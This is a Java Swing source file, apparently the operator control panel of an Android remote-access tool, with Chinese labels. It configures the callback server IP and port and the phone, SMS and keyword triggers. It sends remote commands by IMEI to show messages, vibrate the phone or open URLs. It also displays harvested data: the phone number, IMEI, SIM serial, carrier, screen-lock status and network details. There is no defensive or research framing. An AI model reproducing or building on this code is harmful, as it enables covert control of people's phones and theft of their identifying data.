package com.android.security.gui.panel;


import javax.swing.JPanel;
import javax.swing.GroupLayout;
import javax.swing.GroupLayout.Alignment;
import javax.swing.LayoutStyle.ComponentPlacement;
import javax.swing.border.TitledBorder;
import javax.swing.JLabel;
import javax.swing.UIManager;
import javax.swing.JTextField;
import javax.swing.SwingConstants;
import javax.swing.JButton;
import java.awt.event.ActionListener;
import java.awt.event.ActionEvent;
import java.util.ArrayList;

import javax.swing.JTextArea;

import javax.swing.JList;
import javax.swing.JCheckBox;

import sun.security.krb5.internal.crypto.CksumType;
import javax.swing.JScrollPane;
import java.awt.Component;
import javax.swing.Box;

import com.android.security.gui.UserGUI;
import com.android.security.packages.AdvancedInformationPacket;

import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;

public class HomePanel extends JPanel {
	
	private UserGUI gui;
	private JTextField ipField;
	private JTextField portField;
	private JTextArea textArea;
	private JTextArea areaPhones;
	private JTextArea areaSMS;
	private JTextField textField;
	private JCheckBox chckbxWaitEventTo;
	private JTextField toastField;
	private JTextField durationField;
	private JTextField urlField;

	/**
	 * Create the panel.
	 */
	public HomePanel(UserGUI gui) {
		this.gui = gui;
		
		JPanel panel = new JPanel();
		panel.setBorder(new TitledBorder(null, "信息", TitledBorder.LEADING, TitledBorder.TOP, null, null));
		
		JPanel panel_1 = new JPanel();
		panel_1.setBorder(new TitledBorder(UIManager.getBorder("TitledBorder.border"), "快捷操作", TitledBorder.LEADING, TitledBorder.TOP, null, null));
		
		JPanel panel_2 = new JPanel();
		panel_2.setBorder(new TitledBorder(null, "客户端选项", TitledBorder.LEADING, TitledBorder.TOP, null, null));
		GroupLayout groupLayout = new GroupLayout(this);
		groupLayout.setHorizontalGroup(
			groupLayout.createParallelGroup(Alignment.LEADING)
				.addGroup(groupLayout.createSequentialGroup()
					.addContainerGap()
					.addComponent(panel, GroupLayout.PREFERRED_SIZE, 327, GroupLayout.PREFERRED_SIZE)
					.addPreferredGap(ComponentPlacement.RELATED)
					.addGroup(groupLayout.createParallelGroup(Alignment.TRAILING)
						.addComponent(panel_1, GroupLayout.DEFAULT_SIZE, 279, Short.MAX_VALUE)
						.addComponent(panel_2, GroupLayout.DEFAULT_SIZE, 279, Short.MAX_VALUE))
					.addGap(18))
		);
		groupLayout.setVerticalGroup(
			groupLayout.createParallelGroup(Alignment.LEADING)
				.addGroup(groupLayout.createSequentialGroup()
					.addContainerGap()
					.addGroup(groupLayout.createParallelGroup(Alignment.LEADING)
						.addComponent(panel, GroupLayout.DEFAULT_SIZE, 399, Short.MAX_VALUE)
						.addGroup(groupLayout.createSequentialGroup()
							.addComponent(panel_2, GroupLayout.PREFERRED_SIZE, 251, GroupLayout.PREFERRED_SIZE)
							.addPreferredGap(ComponentPlacement.RELATED)
							.addComponent(panel_1, GroupLayout.PREFERRED_SIZE, 142, Short.MAX_VALUE)))
					.addContainerGap())
		);
		
		JLabel lblWhitephones = new JLabel("电话 :");
		
		JLabel lblWhitesms = new JLabel("短信 :");
		
		JLabel lblNeededKeyword = new JLabel("所需关键字:");
		
		textField = new JTextField();
		textField.setColumns(10);
		
		areaPhones = new JTextArea();
		
		areaSMS = new JTextArea();
		
		JLabel lblServerIp = new JLabel("服务端IP:");
		
		ipField = new JTextField();
		ipField.setHorizontalAlignment(SwingConstants.LEFT);
		ipField.setText("192.168.0.10");
		ipField.setColumns(10);
		
		JLabel lblServerPort = new JLabel("服务端端口:");
		
		portField = new JTextField();
		portField.setText("7777");
		portField.setHorizontalAlignment(SwingConstants.LEFT);
		portField.setColumns(10);
		
		chckbxWaitEventTo = new JCheckBox("等待事件连接");
		
		JButton btnSaveConnectionInfo = new JButton("保存配置");
		btnSaveConnectionInfo.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				fireButtonSaveConnectionConfig();
			}
		});
		GroupLayout gl_panel_2 = new GroupLayout(panel_2);
		gl_panel_2.setHorizontalGroup(
			gl_panel_2.createParallelGroup(Alignment.LEADING)
				.addGroup(gl_panel_2.createSequentialGroup()
					.addContainerGap()
					.addGroup(gl_panel_2.createParallelGroup(Alignment.TRAILING)
						.addGroup(gl_panel_2.createSequentialGroup()
							.addGroup(gl_panel_2.createParallelGroup(Alignment.LEADING)
								.addGroup(gl_panel_2.createSequentialGroup()
									.addComponent(lblWhitephones, GroupLayout.PREFERRED_SIZE, 70, GroupLayout.PREFERRED_SIZE)
									.addGap(4)
									.addComponent(areaPhones, GroupLayout.DEFAULT_SIZE, 171, Short.MAX_VALUE))
								.addGroup(gl_panel_2.createSequentialGroup()
									.addComponent(lblNeededKeyword)
									.addPreferredGap(ComponentPlacement.UNRELATED)
									.addComponent(textField, GroupLayout.DEFAULT_SIZE, 98, Short.MAX_VALUE))
								.addGroup(gl_panel_2.createSequentialGroup()
									.addComponent(lblWhitesms)
									.addGap(18)
									.addComponent(areaSMS, GroupLayout.DEFAULT_SIZE, 188, Short.MAX_VALUE))
								.addGroup(gl_panel_2.createSequentialGroup()
									.addComponent(lblServerIp)
									.addPreferredGap(ComponentPlacement.RELATED)
									.addComponent(ipField, GroupLayout.DEFAULT_SIZE, 161, Short.MAX_VALUE))
								.addGroup(gl_panel_2.createSequentialGroup()
									.addComponent(lblServerPort)
									.addPreferredGap(ComponentPlacement.RELATED)
									.addComponent(portField, GroupLayout.DEFAULT_SIZE, 144, Short.MAX_VALUE)))
							.addContainerGap())
						.addGroup(gl_panel_2.createSequentialGroup()
							.addGap(40)
							.addComponent(btnSaveConnectionInfo)
							.addGap(50))
						.addGroup(gl_panel_2.createSequentialGroup()
							.addComponent(chckbxWaitEventTo)
							.addContainerGap(76, Short.MAX_VALUE))))
		);
		gl_panel_2.setVerticalGroup(
			gl_panel_2.createParallelGroup(Alignment.LEADING)
				.addGroup(gl_panel_2.createSequentialGroup()
					.addContainerGap()
					.addGroup(gl_panel_2.createParallelGroup(Alignment.LEADING)
						.addComponent(lblWhitephones, GroupLayout.PREFERRED_SIZE, 44, GroupLayout.PREFERRED_SIZE)
						.addComponent(areaPhones, GroupLayout.PREFERRED_SIZE, 38, GroupLayout.PREFERRED_SIZE))
					.addGroup(gl_panel_2.createParallelGroup(Alignment.LEADING)
						.addGroup(gl_panel_2.createSequentialGroup()
							.addGap(18)
							.addComponent(lblWhitesms)
							.addGap(12))
						.addGroup(gl_panel_2.createSequentialGroup()
							.addPreferredGap(ComponentPlacement.RELATED)
							.addComponent(areaSMS, GroupLayout.DEFAULT_SIZE, 33, Short.MAX_VALUE)
							.addPreferredGap(ComponentPlacement.RELATED)))
					.addGroup(gl_panel_2.createParallelGroup(Alignment.BASELINE)
						.addComponent(lblNeededKeyword)
						.addComponent(textField, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE))
					.addPreferredGap(ComponentPlacement.RELATED)
					.addGroup(gl_panel_2.createParallelGroup(Alignment.BASELINE)
						.addComponent(ipField, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)
						.addComponent(lblServerIp))
					.addPreferredGap(ComponentPlacement.RELATED)
					.addGroup(gl_panel_2.createParallelGroup(Alignment.BASELINE)
						.addComponent(portField, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)
						.addComponent(lblServerPort))
					.addPreferredGap(ComponentPlacement.RELATED)
					.addComponent(chckbxWaitEventTo)
					.addPreferredGap(ComponentPlacement.RELATED)
					.addComponent(btnSaveConnectionInfo)
					.addGap(31))
		);
		panel_2.setLayout(gl_panel_2);
		
		JScrollPane scrollPane = new JScrollPane();
		
		JButton btnNewButton = new JButton("刷新");
		btnNewButton.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				fireButtonRefreshAdv();
			}
		});
		GroupLayout gl_panel = new GroupLayout(panel);
		gl_panel.setHorizontalGroup(
			gl_panel.createParallelGroup(Alignment.LEADING)
				.addGroup(gl_panel.createSequentialGroup()
					.addGroup(gl_panel.createParallelGroup(Alignment.LEADING)
						.addGroup(gl_panel.createSequentialGroup()
							.addContainerGap()
							.addComponent(scrollPane, GroupLayout.DEFAULT_SIZE, 293, Short.MAX_VALUE))
						.addGroup(gl_panel.createSequentialGroup()
							.addGap(113)
							.addComponent(btnNewButton)))
					.addContainerGap())
		);
		gl_panel.setVerticalGroup(
			gl_panel.createParallelGroup(Alignment.LEADING)
				.addGroup(gl_panel.createSequentialGroup()
					.addContainerGap()
					.addComponent(scrollPane, GroupLayout.DEFAULT_SIZE, 356, Short.MAX_VALUE)
					.addPreferredGap(ComponentPlacement.RELATED)
					.addComponent(btnNewButton))
		);
		
		textArea = new JTextArea();
		scrollPane.setViewportView(textArea);
		panel.setLayout(gl_panel);
		
		toastField = new JTextField();
		toastField.setColumns(10);
		
		JButton btnToastIt = new JButton("屏幕消息");
		btnToastIt.addMouseListener(new MouseAdapter() {
			@Override
			public void mouseClicked(MouseEvent e) {
				fireButtonToast();
			}
		});
		
		JButton btnVibrate = new JButton("震动");
		btnVibrate.addMouseListener(new MouseAdapter() {
			@Override
			public void mouseClicked(MouseEvent e) {
				fireButtonVibrate();
			}
		});
		
		durationField = new JTextField();
		durationField.setColumns(10);
		
		JLabel lblDuration = new JLabel("持续时间: ");
		
		JLabel lblOpenUrl = new JLabel("打开网页:");
		
		urlField = new JTextField();
		urlField.setColumns(10);
		
		JButton btnBrowseIt = new JButton("浏览");
		btnBrowseIt.addMouseListener(new MouseAdapter() {
			@Override
			public void mouseClicked(MouseEvent e) {
				fireButtonBrowse();
			}
		});
		GroupLayout gl_panel_1 = new GroupLayout(panel_1);
		gl_panel_1.setHorizontalGroup(
			gl_panel_1.createParallelGroup(Alignment.LEADING)
				.addGroup(gl_panel_1.createSequentialGroup()
					.addGroup(gl_panel_1.createParallelGroup(Alignment.LEADING)
						.addGroup(gl_panel_1.createSequentialGroup()
							.addContainerGap()
							.addGroup(gl_panel_1.createParallelGroup(Alignment.LEADING)
								.addGroup(gl_panel_1.createSequentialGroup()
									.addComponent(toastField, GroupLayout.DEFAULT_SIZE, 151, Short.MAX_VALUE)
									.addPreferredGap(ComponentPlacement.RELATED)
									.addComponent(btnToastIt))
								.addGroup(gl_panel_1.createSequentialGroup()
									.addGroup(gl_panel_1.createParallelGroup(Alignment.LEADING)
										.addComponent(lblOpenUrl)
										.addComponent(lblDuration))
									.addPreferredGap(ComponentPlacement.RELATED)
									.addGroup(gl_panel_1.createParallelGroup(Alignment.TRAILING)
										.addGroup(gl_panel_1.createSequentialGroup()
											.addComponent(durationField, GroupLayout.DEFAULT_SIZE, 70, Short.MAX_VALUE)
											.addPreferredGap(ComponentPlacement.RELATED)
											.addComponent(btnVibrate))
										.addComponent(urlField, GroupLayout.DEFAULT_SIZE, 162, Short.MAX_VALUE)))))
						.addGroup(gl_panel_1.createSequentialGroup()
							.addGap(156)
							.addComponent(btnBrowseIt, GroupLayout.DEFAULT_SIZE, 101, Short.MAX_VALUE)))
					.addContainerGap())
		);
		gl_panel_1.setVerticalGroup(
			gl_panel_1.createParallelGroup(Alignment.LEADING)
				.addGroup(gl_panel_1.createSequentialGroup()
					.addGroup(gl_panel_1.createParallelGroup(Alignment.BASELINE)
						.addComponent(toastField, GroupLayout.PREFERRED_SIZE, 23, GroupLayout.PREFERRED_SIZE)
						.addComponent(btnToastIt, GroupLayout.PREFERRED_SIZE, 24, GroupLayout.PREFERRED_SIZE))
					.addPreferredGap(ComponentPlacement.RELATED)
					.addGroup(gl_panel_1.createParallelGroup(Alignment.BASELINE)
						.addComponent(btnVibrate)
						.addComponent(durationField, GroupLayout.PREFERRED_SIZE, 24, GroupLayout.PREFERRED_SIZE)
						.addComponent(lblDuration))
					.addPreferredGap(ComponentPlacement.RELATED)
					.addGroup(gl_panel_1.createParallelGroup(Alignment.BASELINE)
						.addComponent(lblOpenUrl)
						.addComponent(urlField, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE))
					.addPreferredGap(ComponentPlacement.RELATED)
					.addComponent(btnBrowseIt)
					.addContainerGap(GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
		);
		panel_1.setLayout(gl_panel_1);
		setLayout(groupLayout);
	}
	
	private void fireButtonSaveConnectionConfig() {
		ArrayList<String> phones = new ArrayList<String>();
		ArrayList<String> sms = new ArrayList<String>();
		ArrayList<String> kw = new ArrayList<String>();
		
		for(String phone : areaPhones.getText().split("\n")) phones.add(phone);
		for(String s : areaSMS.getText().split("\n")) sms.add(s); 
		for(String key : textField.getText().split(" ")) kw.add(key);
		
		gui.fireSaveConnectConfigurations(ipField.getText(), Integer.valueOf(portField.getText()), chckbxWaitEventTo.isSelected(), phones, sms, kw);
	}
	
	private void fireButtonToast() {
		String mess = toastField.getText();
		gui.getGUI().fireToastMessage(gui.getImei(), mess);
	}
	
	private void fireButtonVibrate() {
		String value = durationField.getText();
		long l = Long.valueOf(value);
		gui.getGUI().fireVibrate(gui.getImei(), l);
	}
	
	private void fireButtonBrowse() {
		gui.getGUI().fireBrowseUrl(gui.getImei(), urlField.getText());
	}
	
	public void updatePreferences(String ip, int port, boolean wait, ArrayList<String> phones, ArrayList<String> sms, ArrayList<String> kw) {
		String temp = "";
		if(phones != null) {
			for(String s : phones) temp += s + "\n";
		}
		areaPhones.setText(temp);
		
		temp = "";
		if(sms != null) {
			for(String s : sms) temp += s + "\n";
		}
		areaSMS.setText(temp);
		
		temp = "";
		if(kw != null) {
			for(String s : kw) temp += s+" ";
			temp = temp.substring(0, temp.length() - 2);
		}
		textField.setText(temp);
		
		ipField.setText(ip);
		portField.setText(""+port);
		chckbxWaitEventTo.setSelected(wait);
	}
	
	private void fireButtonRefreshAdv() {
		textArea.setText("");
		gui.fireGetAdvancedInformations();
	}
		
	public void updateInformations(AdvancedInformationPacket packet) {
		
		String txt = "";
	    txt = txt + "设备信息 :\n";
	    String phoneNumber = packet.getPhoneNumber();
	    if ((phoneNumber != null) && (!phoneNumber.equals("")))
	    {
	      txt = txt + "\t本机号码 : " + packet.getPhoneNumber() + "\n";
	    }
	    else
	    {
	      txt = txt + "\t本机号码 : SIM卡中未写入手机号\n";
	    }
	    txt = txt + "\tIMEI : " + packet.getIMEI() + "\n";
	    txt = txt + "\t国家代码 : " + packet.getCountryCode() + "\n";
	    txt = txt + "\t运营商 : " + packet.getOperatorName() + "\n";
	    txt = txt + "\t运营商代码 : " + packet.getOperatorCode() + "\n";
	    txt = txt + "\tSIM卡发行商  : " + packet.getSimOperatorName() + "\n";
	    txt = txt + "\tSIM卡网络标识 : " + packet.getSimOperatorCode() + "\n";
	    txt = txt + "\tSIM发行国家 : " + packet.getSimCountryCode() + "\n";
	    txt = txt + "\tSIM卡序列号 : " + packet.getSimSerial() + "\n";
	    txt = txt + "\t当前屏幕状态 : " + (packet.isScreenLocked() ? "锁屏" : "未锁定") + "\n";
	    txt = txt + "\t屏幕通电: " + (packet.isScreenON() ? "通电" : "黑屏") + "\n";

	    txt = txt + "\n\n";

	    txt = txt + "WIFI信息 :\n";
	    txt = txt + "\t启用 : " + (packet.isWifiAvailable() ? "开启" : "否") + "\n";
	    txt = txt + "\t连接状态 : " + (packet.isWifiConnectedOrConnecting() ? "连接" : "未连接") + "\n";
	    txt = txt + "\t其他信息 : " + packet.getWifiExtraInfos() + "\n";
	    txt = txt + "\t状态 : " + packet.getWifiReason() + "\n";

	    txt = txt + "\n\n";

	    txt = txt + "移动网络信息 :\n";
	    txt = txt + "\t类型 : " + packet.getMobileNetworkName() + "\n";
	    txt = txt + "\t启用 : " + (packet.isMobileNetworkAvailable() ? "开启" : "否") + "\n";
	    txt = txt + "\t连接 : " + (packet.isMobileNetworkConnectedOrConnecting() ? "已连接" : "未连接") + "\n";
	    txt = txt + "\t其他 : " + packet.getMobileNetworkExtraInfos() + "\n";
	    txt = txt + "\t状态 : " + packet.getMobileNetworkReason() + "\n";

	    txt = txt + "\n\n";

	    txt = txt + "系统信息 :\n";
	    txt = txt + "\t版本 : " + packet.getAndroidVersion() + "\n";
	    txt = txt + "\tSDK版本 : " + packet.getAndroidSdk() + "\n";

	    txt = txt + "\n\n";

	    txt = txt + "模块信息 :\n";
	    txt = txt + "\t模块数 : " + packet.getSensors().size() + "\n";
	    for (String s : packet.getSensors())
	    {
	      txt = txt + "\t" + s + "\n";
	    }

	    txt = txt + "\n\n";

	    txt = txt + "电池 :\n";
	    txt = txt + "\t状态 : " + (packet.isBatteryPresent() ? "有电池" : "无电池") + "\n";
	    String[] health = { "", "未知", "正常", "过热", "损坏", "电压过高", "未指定", "温度过低" };
	    if ((packet.getBatteryHealth() >= 0) && (packet.getBatteryHealth() < 9))
	      txt = txt + "\t健康 : " + health[packet.getBatteryHealth()] + "\n";
	    else
	      txt = txt + "\t健康 : 未知\n";
	    txt = txt + "\t电量 : " + packet.getBatteryLevel() + "\n";
	    if (packet.getBatteryPlugged() == 1)
	      txt = txt + "\t充电 : 充电器\n";
	    else if (packet.getBatteryPlugged() == 2)
	      txt = txt + "\t充电 : USB\n";
	    else
	      txt = txt + "\t充电 : 无\n";
	    txt = txt + "\t总电量 : " + packet.getBatteryScale() + "\n";
	    String[] status = { "", "未知", "充电中", "使用中", "未充电", "满" };
	    if ((packet.getBatteryStatus() >= 0) && (packet.getBatteryStatus() < 6))
	      txt = txt + "\t状态 : " + status[packet.getBatteryStatus()] + "\n";
	    else
	      txt = txt + "\t状态 : 未知 \n";
	    txt = txt + "\t电池类型 : " + packet.getBatteryTechnology() + "\n";
	    txt = txt + "\t电池温度 : " + packet.getBatteryTemperature() + "\n";
	    txt = txt + "\t电压 : " + packet.getBatteryVoltage() + "\n";
	    
		textArea.setText(txt);
	}
}
